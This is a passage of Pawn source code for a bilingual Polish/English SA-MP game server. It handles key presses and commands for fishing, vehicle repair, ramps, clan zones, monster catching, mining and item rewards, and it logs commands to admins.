			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
	if(!success) 
	{
	    Sound(playerid, 1053, 0.0, 0.0, 0.0);
		new msgs[256];
		if(!ENMode[playerid]) format(msgs, sizeof(msgs), ""C_RED"Komenda "C_WHITE"%s "C_RED"nie zosta³a znaleziona. U¿yj "C_WHITE"/help"C_RED", aby uzyskaæ pomoc.", cmdtext);
		else format(msgs, sizeof(msgs), ""C_RED"Command "C_WHITE"%s "C_RED"not found. Check "C_WHITE"/help"C_RED".", cmdtext);
		return SendClientMessage(playerid,RED, msgs);
	}
	else
	{
	    new prstr[128];
	    format(prstr, sizeof(prstr), "[cmd] %s (id %d) --> %s", Player[playerid][Name], playerid, cmdtext);
	    print(prstr);
	    Loop(loopid, MAX_PLAYERS)
	    {
	        if(Player[loopid][Admin] > 0 && Eye[loopid] && !BustedMode[loopid])
	        {
	            new eyemsg[128];
	            format(eyemsg, sizeof(eyemsg), "{FF0000}[eye] %s (id %d) --> %s", Player[playerid][Name], playerid, cmdtext);
	            SendClientMessage(loopid, RED, eyemsg);
	        }
	    }
	   	new msg[256];
		format(msg, sizeof(msg), "[%02d:%02d:%02d] [cmd] %s (%d): %s", hour, minute, second, Player[playerid][Name], playerid, cmdtext);
    	DCC_SendChannelMessage(samp_admin, msg);
	}
	return 1;
}

CMD:ramps(playerid, params[])
{
	if(Ramps[playerid]) {
	    Ramps[playerid] = false;
	    SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Rampy wy³¹czone."); }
	else {
	    Ramps[playerid] = true;
	    SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Rampy w³¹czone."); }
	return 1;
}

forward FishingStart(playerid);
public FishingStart(playerid) {
   	if(GetPVarInt(playerid,"Lowienie") > gettime()) return DialogError(playerid, "{FFFF00}£owienie w kó³ko jest mêcz¹ce. Odpocznij trochê.");
  	SetPVarInt(playerid,"Lowienie",gettime()+60);
  	OnGame[playerid] = -1;
	ResetUFO(playerid);
	SetProgressBarMaxValue(FishingBar[playerid], 100);
	SetProgressBarValue(FishingBar[playerid], 0);
	UpdateProgressBar(FishingBar[playerid], playerid);
	ShowProgressBarForPlayer(playerid, FishingBar[playerid]);
	LowienieTrwa[playerid] = true;
	FProgress[playerid] = 0;
	PlayerPlaySound(playerid,1144,0.0,0.0,0.0);
	TogglePlayerControllable(playerid, 0);
	ApplyAnimation(playerid,"SWORD","sword_block",50.0 ,0,1,0,1,1);
 	SetPlayerAttachedObject(playerid, 5,18632,6,0.079376,0.037070,0.007706,181.482910,0.000000,0.000000,1.000000,1.000000,1.000000);
	PlayerTextDrawShow(playerid, Fishing0P[playerid]);
	new czas = random(3) + 1;
	FTimer[playerid] = SetTimerEx("FishingEnd", 1000*czas, 0, "i", playerid);
	return 1; }

forward FishingEnd(playerid);
public FishingEnd(playerid) {
    TogglePlayerControllable(playerid, 1);
	KillTimer(FTimer[playerid]);
  	RemovePlayerAttachedObject(playerid, 5);
	HideProgressBarForPlayer(playerid, FishingBar[playerid]);
	LowienieTrwa[playerid] = false;
	FProgress[playerid] = 0;
	PlayerTextDrawHide(playerid, Fishing0P[playerid]);
	return SendClientMessage(playerid, RED, "£owienie nie powiod³o siê."); }

forward removeObject(playerid, objectid);
public removeObject(playerid, objectid) DestroyPlayerObject(playerid, objectid);
getAngle(playerid, &Float:angle) return (IsPlayerInAnyVehicle(playerid)) ? GetVehicleZAngle(GetPlayerVehicleID(playerid), angle) : GetPlayerFacingAngle(playerid, angle);
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(newkeys & KEY_CROUCH)
	    fAutoC[playerid] = 0;
	if(isCbug[playerid] == 1)
    {
 		if(GetPlayerWeapon(playerid) == 24)
        {
        	if(GetPlayerAmmo(playerid) == 7 && PRESSED(KEY_FIRE))
         	{
          		ccount[0][playerid] = GetTickCount();
                disparou[playerid] = true;
            }
            else if(RELEASED(KEY_FIRE))
            {
            	if(GetPlayerAmmo(playerid) == 0)
             	{
             	    SetPlayerVirtualWorld(playerid, 0);
					SetPlayerHealth(playerid, 100.0);
              		ccount[1][playerid] = GetTickCount();
                	ccount[2][playerid] = ccount[1][playerid] - ccount[0][playerid];
                 	ccount[3][playerid] = ccount[2][playerid] / 1000;
                  	disparou[playerid] = false;
                  	new sstr[256];
                   	format(sstr, sizeof(sstr), "~y~~h~CZAS: ~r~~h~%0.4f~y~s", ccount[3][playerid]);
                    GameTextForPlayer(playerid, sstr, 4000, 4);
					if(ccount[3][playerid] < Player[playerid][GL]) {
					    Player[playerid][GL] = ccount[3][playerid];
						format(sstr, sizeof(sstr), ""PYTAJNIK""C_NICK"%s(%d) {b3ccff}ustanowi³ nowy, osobisty rekord glitch! ("C_WHITE"%0.4fs{b3ccff})", Player[playerid][Name], playerid, ccount[3][playerid]);
						SendClientMessageToAll(RED, sstr); }
					SpawnPlayer(playerid);
					SpawnFunction(playerid);
					isCbug[playerid] = 0;
				}
			}
		}
	}
	if(PRESSED(KEY_AIM | KEY_JUMP) && GetPVarInt(playerid,"rsp") < gettime()) return cmd_rsp(playerid, "");
	if(PRESSED(KEY_SUBMISSION) && IsPlayerInAnyVehicle(playerid))
	{
	    if(!GetPlayerVirtualWorld(playerid) || GetPlayerVirtualWorld(playerid) == 50)
	    {
			if(GetPVarInt(playerid,"RepairCar") < gettime())
			{
      	if(Player[playerid][Cash] < 1000) return DialogError(playerid, "{FFFF00}Naprawa pojazdu kosztuje "C_WHITE"$1000{FFFF00}.");
				SetPVarInt(playerid,"RepairCar",gettime()+10);
        Player[playerid][Cash] -= 1000;
   		if(ReflexType == 16) {
			AddExp(playerid, 40);
			Player[playerid][Cash] += 5000;
			Player[playerid][Czat]++;
  			new kodstr[256];
	  		format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
			SendClientMessageToAll(-1, kodstr);
			ReflexType = -1;
			ReflexActive = false;
			Loop(loopid, MAX_PLAYERS) {
		    	if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
				RepairVehicle(GetPlayerVehicleID(playerid));
				PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
				if(!ENMode[playerid]) GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~b~~h~~h~POJAZD NAPRAWIONY!", 4500, 3);
				else GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~b~~h~~h~VEHICLE REPAIRED!", 4500, 3);
			}
			else { return 1; }
		}
	}
	if(PRESSED(KEY_ACTION) && IsPlayerInAnyVehicle(playerid) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && Ramps[playerid])
	{
		if(GetPlayerVirtualWorld(playerid)) return 0;
		new vehicleid = GetPlayerVehicleID(playerid);
		if(!IsMotor(vehicleid) && !IsCar(vehicleid) && !IsModelBoat(vehicleid)) return 0;

		if(GetPVarInt(playerid,"RampsInfo") < gettime())
		{
			SetPVarInt(playerid,"RampsInfo",gettime()+60);
			SendClientMessageEx(playerid, -1, ""PYTAJNIK""C_ORANGE"Mo¿esz zarz¹dzaæ dostêpnoœci¹ ramp pod komend¹ "C_WHITE"/ramps"C_ORANGE".", ""PYTAJNIK""C_ORANGE"You can change ramps status under "C_WHITE"/ramps"C_ORANGE" command.");
		}

		new Float:p[4];
		GetPlayerPos(playerid, p[0], p[1], p[2]);
		getAngle(playerid, p[3]);
		getPosInFrontOf(p[0], p[1], p[3], 22.5);
		return SetTimerEx("removeObject", 2000, 0, "ii", playerid, CreatePlayerObject(playerid, 19005, p[0], p[1], p[2] - 1.35, -11.5, 0.0, p[3]));
	}
	if(PRESSED(KEY_NO) && ReflexType == 3)
	{
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); }
		return 1;
	}
	if(PRESSED(KEY_YES) && ReflexType == 4)
	{
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); }
		return 1;
	}
	if(PRESSED(KEY_NO) && ClanStrefa[playerid])
	{
	    new Float:x, Float:y, Float:z;
	    GetPlayerPos(playerid, x, y, z);
		ClanPunkty[playerid]++;
		if(ClanPunkty[playerid] == 1)
		{
			ClanMinX[playerid] = x;
			ClanMinY[playerid] = y;
			ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie dzielnicy klanu", ""C_WHITE"Œwietnie! Masz ju¿ jeden róg dzielnicy.\n"C_WHITE"Stañ teraz na drugim rogu ("C_RED"po przek¹tnej"C_WHITE") po czym naciœnij klawisz "C_BLUE1"N"C_WHITE".\n\nSerwer sprawdzi, czy teren zosta³ prawid³owo oznaczony.", "Zamknij", "");
			return SendClientMessage(playerid, -1, "*  "C_BLUE1"JedŸ do drugiego rogu dzielnicy i naciœnij klawisz "C_WHITE"N"C_BLUE1".");
		}
		if(ClanPunkty[playerid] == 2)
		{
			ClanMaxX[playerid] = x;
			ClanMaxY[playerid] = y;
 			if(ClanMinX[playerid] > ClanMaxX[playerid] || ClanMinY[playerid] > ClanMaxY[playerid])
			{
  				ClanColor[playerid] = -1;
 				ClanStrefa[playerid] = false;
  				ClanPatriot[playerid] = false;
   				ClanPunkty[playerid] = 0;
			 	SendClientMessage(playerid, RED, "Strefa z wybranym po³o¿eniem nie mo¿e zostaæ stworzona. Spróbuj wybraæ inny teren.");
    			return SendClientMessage(playerid, RED, "Anulowano proces tworzenia klanu. Klan nie zosta³ stworzony.");
			}
			Loop(zony, MAX_GANGZONES)
			{
 				if(IsPlayerInArea(playerid, gzmiX[zony], gzmiY[zony], gzmaX[zony], gzmaY[zony]))
				{
  					ClanColor[playerid] = -1;
 					ClanStrefa[playerid] = false;
  					ClanPatriot[playerid] = false;
   					ClanPunkty[playerid] = 0;
			 		SendClientMessage(playerid, RED, "Strefa z wybranym po³o¿eniem nie mo¿e zostaæ stworzona. Spróbuj wybraæ inny teren.");
    				return SendClientMessage(playerid, RED, "Anulowano proces tworzenia klanu. Klan nie zosta³ stworzony.");
				}
			}
			ClanStrefa[playerid] = false;
			ClanPatriot[playerid] = true;
			ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Gratulacje!", ""C_WHITE"Gratulacje! Serwer nie wykry³ b³êdów w Twoim terenie.\n\nTeraz u¿yj "C_BLUE1"/v patriot"C_WHITE".\nUstaw pojazd w miejscu, gdzie ma siê pojawiaæ na wojnie po czym naciœnij klawisz "C_BLUE1"N"C_WHITE".\n\n"C_RED"Pojazd musi znajdowaæ siê na zaznaczonym terenie.", "Zamknij", "");
			return SendClientMessage(playerid, -1, "*  "C_BLUE1"U¿yj "C_WHITE"/v patriot "C_BLUE1"i ustaw pojazd w odpowiednim miejscu.");
		}
	}
	if(PRESSED(KEY_NO) && ClanPatriot[playerid])
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return 1;
	    new Float:x, Float:y, Float:z, Float:a;
		new currentveh = GetPlayerVehicleID(playerid);
		new currentvehid = GetVehicleModel(currentveh);
 	    GetVehiclePos(currentveh, x, y, z);
	    GetVehicleZAngle(currentveh, a);
	    if(currentvehid != 470) return 1;
	    if(!IsPlayerInArea(playerid, ClanMinX[playerid], ClanMinY[playerid], ClanMaxX[playerid], ClanMaxY[playerid])) return SendClientMessage(playerid, RED, "Pojazd nie znajduje siê na terenie tworzonej strefy.");
	    ClanPatriot[playerid] = false;
		ClanPatriotX[playerid] = x;
		ClanPatriotY[playerid] = y;
		ClanPatriotZ[playerid] = z;
		ClanPatriotA[playerid] = a;
		ClanPunkt[playerid] = true;
		return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Tworzenie klanu", ""C_WHITE"Ustaw teraz punkt startowy Twojego klanu.\nMusi znajdowaæ siê na terenie klanu.", "Zamknij", "");
	}
	if(PRESSED(KEY_NO) && ClanPunkt[playerid])
	{
	    if(!IsPlayerInArea(playerid, ClanMinX[playerid], ClanMinY[playerid], ClanMaxX[playerid], ClanMaxY[playerid])) return SendClientMessage(playerid, RED, "Wybrany punkt nie znajduje siê na terenie tworzonej strefy.");
		new Float:x, Float:y, Float:z;
		GetPlayerPos(playerid, x, y, z);
		ClanSpawnX[playerid] = x;
		ClanSpawnY[playerid] = y;
		ClanSpawnZ[playerid] = z;
		new clanstr[256];
		format(clanstr, sizeof(clanstr), ""C_WHITE"Podsumujmy Twoje ustawienia:\n\n");
		format(clanstr, sizeof(clanstr), "%s"C_BLUE1"Nazwa klanu: "C_WHITE"%s\n", clanstr, ClanName[playerid]);
		format(clanstr, sizeof(clanstr), "%s"C_BLUE1"Tag klanu: "C_WHITE"[%s]\n\n", clanstr, ClanTag[playerid]);
		format(clanstr, sizeof(clanstr), "%s"C_GREEN"Kolor klanu, dzielnica oraz pozycja pojazdu zosta³y zapisane.\n\n", clanstr, ClanTag[playerid]);
		format(clanstr, sizeof(clanstr), "%s"C_BLUE1"Chcesz utworzyæ klan?", clanstr);
		return ShowPlayerDialog(playerid, DIALOG_KLANCONFIRM, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Podsumowanie klanu", clanstr, "Stwórz", "Anuluj");
	}
	if(PRESSED(KEY_YES) && !GetPlayerVirtualWorld(playerid)) {
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, 877.0612,2011.1553,10.8254)) return ShowBankMenu(playerid); }
	if(PRESSED(KEY_YES) && !GetPlayerVirtualWorld(playerid))
	{
	    Loop(pokemonid, MAX_POKEMONS)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 7.5, PokX[pokemonid], PokY[pokemonid], PokZ[pokemonid]) && PokemonSpawned[pokemonid])
	        {
	            if(CatchingPokemon[playerid] != -1) return DialogError(playerid, "{FFFF00}Jesteœ w trakcie ³apania potwora.");
	            if(IsCatching[pokemonid]) return DialogError(playerid, "{FFFF00}Ktoœ ³apie ju¿ tego potwora.");
	            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return DialogError(playerid, "{FFFF00}Nie mo¿esz ³apaæ potworów bêd¹c w pojeŸdzie.");
				if(!PlayerHaveItem(playerid, "{FF0400}Catching "C_WHITE"Tool")) return DialogError(playerid, "{FFFF00}Nie posiadasz {FF0400}Catching "C_WHITE"Tool {FFFF00}w ekwipunku.\n\n{FFFF00}Gdzie zdobyæ {FF0400}Catching "C_WHITE"Tool{FFFF00}:\n- ItemShop (/is)\n- ItemParki na mapie");
                if(PokemonType[pokemonid] == 7) {
					new Float:healthp;
					GetPlayerHealth(playerid, healthp);
					if(healthp < 30) SetPlayerHealth(playerid, 100.0);
					CreateExplosion(PokX[pokemonid], PokY[pokemonid], PokZ[pokemonid], 9, 1.0); }
				CatchingPokemon[playerid] = pokemonid;
    			IsCatching[pokemonid] = true;
				RemoveItem(playerid, "{FF0400}Catching "C_WHITE"Tool", 1);
    			ApplyAnimation(playerid, "GRENADE", "WEAPON_throw", 4.0, 0, 0, 0, 0, 0, 1);
				return SetTimerEx("CatchPokemon", 4000, 0, "i", playerid);
			}
		}
		Loop(kamienid, MAX_KAMIEN)
		{
		    if(IsPlayerInRangeOfPoint(playerid, 2.4, kX[kamienid], kY[kamienid], kZ[kamienid]) && KamienOnMap[kamienid] && !kKopany[kamienid])
		    {
		    	if(Kopie[playerid]) return DialogError(playerid, "{FFFF00}Kopiesz ju¿ jakiœ kamieñ.");
		       	if(GetPlayerWeapon(playerid) != 6) return DialogError(playerid, "{FFFF00}Musisz trzymaæ ³opatê, aby móc kopaæ.\n£opatê mo¿esz kupiæ pod "C_WHITE"/lopata{FFFF00}.");
				if(GetPlayerWeapon(playerid) == 6 && GProgress[playerid] < 3) return DialogError(playerid, "{FFFF00}Twoja ³opata jest ju¿ mocno zu¿yta.\nKup now¹ za pomoc¹ "C_WHITE"/lopata{FFFF00}.");
		    	if(kKopany[kamienid]) return DialogError(playerid, "{FFFF00}Ktoœ inny kopie ju¿ ten kamieñ.");
    			if(GetPVarInt(playerid,"Kopanie") > gettime()) return DialogError(playerid, "{FFFF00}Kopanie w kó³ko jest mêcz¹ce. Odpocznij trochê.");
				pkamien[playerid] = kamienid;
				kKopany[kamienid] = true;
				Kopie[playerid] = true;
				TogglePlayerControllable(playerid, 0);
				GivePlayerWeapon(playerid, 6, 1);
 				if(GProgress[playerid] > 75) {
				 	SetTimerEx("EndKopanie", 9000, 0, "i", playerid);
				 	SetPVarInt(playerid,"Kopanie",gettime()+25); }
 				if(GProgress[playerid] < 76 && GProgress[playerid] > 49) {
				 	SetTimerEx("EndKopanie", 11000, 0, "i", playerid);
					SetPVarInt(playerid,"Kopanie",gettime()+30); }
 				if(GProgress[playerid] < 50 && GProgress[playerid] > 24) {
				 	SetTimerEx("EndKopanie", 15000, 0, "i", playerid);
				 	SetPVarInt(playerid,"Kopanie",gettime()+40); }
 				if(GProgress[playerid] < 25) {
				 	SetTimerEx("EndKopanie", 20000, 0, "i", playerid);
          			SetPVarInt(playerid,"Kopanie",gettime()+45); }
				return ApplyAnimation(playerid,"CHAINSAW","CSAW_1",4.1,1,0,0,1,0,1);
		    }
		}
		Loop(parkid, MAX_PARKS)
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.9, ipx[parkid], ipy[parkid], ipz[parkid]))
			{
			    if(GetPVarInt(playerid,"IPark") > gettime()) return DialogError(playerid, "{FFFF00}Odwiedza³eœ ostatnio jeden z ItemParków.");
				SetPVarInt(playerid,"IPark",gettime()+180);
				switch(random(7)) {
	   				case 0: {
					    new randomc = random(2) + 1;
				 		AddItem(playerid, "{FF0400}Catching "C_WHITE"Tool", randomc);
				   		new ct[256];
				   		format(ct, sizeof(ct), "{FFFF00}Zdobywasz %dx {FF0400}Catching "C_WHITE"Tool{FFFF00}.", randomc);
			   		 	return DialogError(playerid, ct); }
				    case 1: {
				   		AddItem(playerid,"{68A028}Kanister paliwa", 1);
			   		 	return DialogError(playerid, "{FFFF00}Zdobywasz {68A028}kanister paliwa{FFFF00}."); }
		   		 	case 2: {
				   		AddItem(playerid, "{AFAFAF}Bomba", 1);
					 	return DialogError(playerid, "{FFFF00}Zdobywasz {AFAFAF}bombê{FFFF00}."); }
				    case 3: {
				   		AddItem(playerid, "{FFFFFF}Karta kolekcjonerska", 1);
					 	return DialogError(playerid, "{FFFF00}Zdobywasz "C_WHITE"kartê kolekcjonersk¹{FFFF00}."); }
				    case 4: {
						new randomc = random(80) + 20;
						AddExp(playerid, randomc);
				   		new ct[256];
				   		format(ct, sizeof(ct), "{FFFF00}Zdobywasz "C_WHITE"%d{FFFF00} EXP.", randomc);
			   		 	return DialogError(playerid, ct); }
				    case 5:
				    {
				        if(IsKlasterFree(playerid))
				        {
				   			new ct[256];
				   			format(ct, sizeof(ct), "{FFFF00}Zdobywasz "C_GREEN"Klaster danych{FFFF00}.");
			   		 		DialogError(playerid, ct);
			   		 		if(!Klastry[playerid][0]) return Klastry[playerid][0] = true;
			   		 		if(!Klastry[playerid][1]) return Klastry[playerid][1] = true;
			   		 		if(!Klastry[playerid][2]) return Klastry[playerid][2] = true;
			   		 		if(!Klastry[playerid][3]) return Klastry[playerid][3] = true;
			   		 		if(!Klastry[playerid][4]) return Klastry[playerid][0] = true;
			   		 		if(!Klastry[playerid][5]) return Klastry[playerid][5] = true;
			   		 		if(!Klastry[playerid][6]) return Klastry[playerid][6] = true;
			   		 		if(!Klastry[playerid][7]) return Klastry[playerid][7] = true;
						}
						else
						{
							new randomc = random(80) + 20;
							AddExp(playerid, randomc);
				   			new ct[256];
				   			format(ct, sizeof(ct), "{FFFF00}Zdobywasz "C_WHITE"%d{FFFF00} EXP.", randomc);
			   		 		return DialogError(playerid, ct);
						}
					}
				    case 6:
				    {
				        if(IsKlasterFree(playerid))
				        {
				   			new ct[256];
				   			format(ct, sizeof(ct), "{FFFF00}Zdobywasz "C_GREEN"Klaster danych{FFFF00}.");
			   		 		DialogError(playerid, ct);
			   		 		if(!Klastry[playerid][0]) return Klastry[playerid][0] = true;
			   		 		if(!Klastry[playerid][1]) return Klastry[playerid][1] = true;
			   		 		if(!Klastry[playerid][2]) return Klastry[playerid][2] = true;
			   		 		if(!Klastry[playerid][3]) return Klastry[playerid][3] = true;
			   		 		if(!Klastry[playerid][4]) return Klastry[playerid][0] = true;
			   		 		if(!Klastry[playerid][5]) return Klastry[playerid][5] = true;
			   		 		if(!Klastry[playerid][6]) return Klastry[playerid][6] = true;
			   		 		if(!Klastry[playerid][7]) return Klastry[playerid][7] = true;
						}
						else
						{
							new randomc = random(80) + 20;
							AddExp(playerid, randomc);
				   			new ct[256];
				   			format(ct, sizeof(ct), "{FFFF00}Zdobywasz "C_WHITE"%d{FFFF00} EXP.", randomc);
			   		 		return DialogError(playerid, ct);
						}
					}
				}
			}
		}
  		if(IsPlayerInRangeOfPoint(playerid, 3.5, 2431.8486,-1679.3871,13.7761) && !GetPlayerVirtualWorld(playerid)) {
		  	new pracastr[1024];
		  	format(pracastr, sizeof(pracastr), ""C_WHITE"01. "C_BLUE1"Transport\n"C_WHITE"02. "C_BLUE1"Koszenie trawy\n"C_WHITE"03. "C_BLUE1"Zrzut paczki\n"C_WHITE"04. "C_BLUE1"Górnictwo "C_WHITE"("C_BLUE1"/kopalnia"C_WHITE")\n05. "C_BLUE1"Nurek\n"C_WHITE"06. "C_BLUE1"Zbieranie œmieci\n");
			format(pracastr, sizeof(pracastr), "%s"C_WHITE"07. "C_BLUE1"Czyszczenie ulic\n"C_WHITE"08. "C_BLUE1"Taksówkarz\n"C_WHITE"09. "C_BLUE1"Wêdkarz "C_WHITE"("C_BLUE1"/wedkarstwo"C_WHITE")", pracastr);
		  	return ShowPlayerDialog(playerid, DIALOG_PRACA, DIALOG_STYLE_LIST, ""C_YELLOW"Pracodawca", pracastr, "Wybierz", "Zamknij"); }
  		if(IsPlayerInRangeOfPoint(playerid, 2.5, -1387.2162,-2266.6077,38.6712) && !GetPlayerVirtualWorld(playerid))
  		{
  		    new kstr[1024];
  		    if(Player[playerid][r1] >= 100) format(kstr, sizeof(kstr), "{d62117}Czerwony rubin "C_YELLOW"x%d "C_GREEN"Handel mo¿liwy\n", Player[playerid][r1]);
  		    else format(kstr, sizeof(kstr), "{d62117}Czerwony rubin "C_YELLOW"x%d "C_RED"Brakuje "C_YELLOW"%d\n", Player[playerid][r1], 100 - Player[playerid][r1]);
  		    if(Player[playerid][r2] >= 100) format(kstr, sizeof(kstr), "%s{ad4820}MiedŸ "C_YELLOW"x%d "C_GREEN"Handel mo¿liwy\n", kstr, Player[playerid][r2]);
  		    else format(kstr, sizeof(kstr), "%s{ad4820}MiedŸ "C_YELLOW"x%d "C_RED"Brakuje "C_YELLOW"%d\n", kstr, Player[playerid][r2], 100 - Player[playerid][r2]);
  		    if(Player[playerid][r3] >= 100) format(kstr, sizeof(kstr), "%s{c6c6c6}Srebro "C_YELLOW"x%d "C_GREEN"Handel mo¿liwy\n", kstr, Player[playerid][r3]);
  		    else format(kstr, sizeof(kstr), "%s{c6c6c6}Srebro "C_YELLOW"x%d "C_RED"Brakuje "C_YELLOW"%d\n", kstr, Player[playerid][r3], 100 - Player[playerid][r3]);
  		    if(Player[playerid][r4] >= 100) format(kstr, sizeof(kstr), "%s{42cef4}Diament "C_YELLOW"x%d "C_GREEN"Handel mo¿liwy\n", kstr, Player[playerid][r4]);
  		    else format(kstr, sizeof(kstr), "%s{42cef4}Diament "C_YELLOW"x%d "C_RED"Brakuje "C_YELLOW"%d\n", kstr, Player[playerid][r4], 100 - Player[playerid][r4]);
  		    if(Player[playerid][r5] >= 100) format(kstr, sizeof(kstr), "%s{ffe60c}Z³oto "C_YELLOW"x%d "C_GREEN"Handel mo¿liwy\n", kstr, Player[playerid][r5]);
  		    else format(kstr, sizeof(kstr), "%s{ffe60c}Z³oto "C_YELLOW"x%d "C_RED"Brakuje "C_YELLOW"%d\n", kstr, Player[playerid][r5], 100 - Player[playerid][r5]);
  		    if(Player[playerid][r6] >= 100) format(kstr, sizeof(kstr), "%s{ee0cff}Party"C_WHITE"Stone "C_YELLOW"x%d "C_GREEN"Handel mo¿liwy\n", kstr, Player[playerid][r6]);
  		    else format(kstr, sizeof(kstr), "%s{ee0cff}Party"C_WHITE"Stone "C_YELLOW"x%d "C_RED"Brakuje "C_YELLOW"%d\n", kstr, Player[playerid][r6], 100 - Player[playerid][r6]);
  		    if(Player[playerid][r7] >= 100) format(kstr, sizeof(kstr), "%s{36a538}Szmaragd "C_YELLOW"x%d "C_GREEN"Handel mo¿liwy", kstr, Player[playerid][r7]);
  		    else format(kstr, sizeof(kstr), "%s{36a538}Szmaragd "C_YELLOW"x%d "C_RED"Brakuje "C_YELLOW"%d", kstr, Player[playerid][r7], 100 - Player[playerid][r7]);
 			return ShowPlayerDialog(playerid, DIALOG_KOPALNIA, DIALOG_STYLE_LIST, ""C_YELLOW"Górnik", kstr, "Sprzedaj", "Zamknij");
		}
	}
	if(PRESSED(KEY_YES) && LowienieTrwa[playerid])
	{
	    FProgress[playerid]++;
		new progress = FProgress[playerid] * 10;
	    SetProgressBarValue(FishingBar[playerid], progress);
	    UpdateProgressBar(FishingBar[playerid], playerid);
	    PlayerPlaySound(playerid,1137,0.0,0.0,0.0);
	    if(FProgress[playerid] >= 10)
	    {
			KillTimer(FTimer[playerid]);
  			RemovePlayerAttachedObject(playerid, 5);
  			TogglePlayerControllable(playerid, 1);
			HideProgressBarForPlayer(playerid, FishingBar[playerid]);
			LowienieTrwa[playerid] = false;
			FProgress[playerid] = 0;
			PlayerTextDrawHide(playerid, Fishing0P[playerid]);
			new zlowionaryba = random(12);
			new exp = random(40) + 10;
			AddExp(playerid, exp);
			new textstr[256];
			if(zlowionaryba == 0)
			{
			    if(rybadnia == 0 && ServerEvent && SEventType == 3) {
			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}sandacza{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}sandacza{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 1)
			{
			    if(rybadnia == 1 && ServerEvent && SEventType == 3) {
			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}szczupaka{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}szczupaka{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 2)
			{
			    if(rybadnia == 2 && ServerEvent && SEventType == 3) {
 			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}okonia{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}okonia{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 3)
			{
			    if(rybadnia == 3 && ServerEvent && SEventType == 3) {
			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}wêgorza europejskiego{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}wêgorza europejskiego{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 4)
			{
			    if(rybadnia == 4 && ServerEvent && SEventType == 3) {
			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}suma{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}suma{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 5)
			{
			    if(rybadnia == 5 && ServerEvent && SEventType == 3) {
			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}p³oæ{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}p³oæ{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 6)
			{
			    if(rybadnia == 6 && ServerEvent && SEventType == 3) {
 			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}karpia{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
